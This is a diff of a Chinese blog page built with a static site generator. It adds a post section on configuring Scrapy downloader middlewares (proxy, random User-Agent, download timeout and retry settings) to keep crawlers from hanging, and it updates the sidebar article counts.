+<h3 id="添加下载中间件"><a href="#添加下载中间件" class="headerlink" title="添加下载中间件"></a>添加下载中间件</h3><p>&emsp;&emsp;将上面的中间件添加到<code>setting.py</code>中，<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DOWNLOADER_MIDDLEWARES = &#123;</span><br><span class="line">    <span class="hljs-string">'scrapy_first.middlewares.MyproxyMiddleware'</span>:<span class="hljs-number">200</span>,</span><br><span class="line">    <span class="hljs-string">'scrapy_first.middlewares.RandomUserAgent'</span>:<span class="hljs-number">158</span>,</span><br><span class="line">    <span class="hljs-string">'scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware'</span>:<span class="hljs-number">500</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;<code>scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware</code>这个中间件可以定义超时时间，配合<code>DOWNLOAD_TIMEOUT = 200</code>使用。这也是防止爬虫停顿的方法。另一个跟这个功能差不多的是：<code>scrapy.contrib.downloadermiddleware.retry.RetryMiddleware</code>，有需要的也可以添加进去，它会把超时或者 HTTP 500 错误导致失败的页面记录下来，当爬虫爬取完正常的页面后再统一重新请求这些异常也页面。它有三个属性：</p>
+<ul>
+<li>RETRY_ENABLED</li>
+<li>RETRY_TIMES</li>
+<li>RETRY_HTTP_CODES</li>
+</ul>
+<p>&emsp;&emsp;各自的属性：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">RETRY_ENABLED</span><br><span class="line"></span><br><span class="line">新版功能。</span><br><span class="line"></span><br><span class="line">默认： True</span><br><span class="line"></span><br><span class="line">Retry Middleware 是否启用。</span><br><span class="line"></span><br><span class="line">RETRY_TIMES</span><br><span class="line"></span><br><span class="line">默认：2</span><br><span class="line"></span><br><span class="line">包括第一次下载，最多的重试次数</span><br><span class="line"></span><br><span class="line">RETRY_HTTP_CODES</span><br><span class="line"></span><br><span class="line">默认： [500, 502, 503, 504, 400, 408]</span><br><span class="line"></span><br><span class="line">重试的 response 返回值(code)。其他错误(DNS 查找问题、连接失败及其他)则一定会进行重试。</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;通过合理配置这些下载中间件就能很好的避免爬虫卡死的情况。</p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
 
     
 <div class="card card-transparent">
@@ -909,7 +901,7 @@
                         文章
                     </p>
                     <p class="title has-text-weight-normal">
-                        59
+                        58
                     </p>
                 </div>
             </div>
@@ -1010,7 +1002,7 @@
                 <span class="level-item">jekyll update</span>
             </span>
             <span class="level-end">
-                <span class="level-item tag">27</span>
+                <span class="level-item tag">26</span>
             </span>
         </a></li>
             </ul>
@@ -1218,7 +1210,7 @@
                     <span class="level-item">三月 2018</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">14</span>
+                    <span class="level-item tag">13</span>
                 </span>
             </a>
         </li>
@@ -1690,7 +1682,7 @@
                     <span class="level-item">三月 2018</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">14</span>
+                    <span class="level-item tag">13</span>
                 </span>
             </a>
         </li>
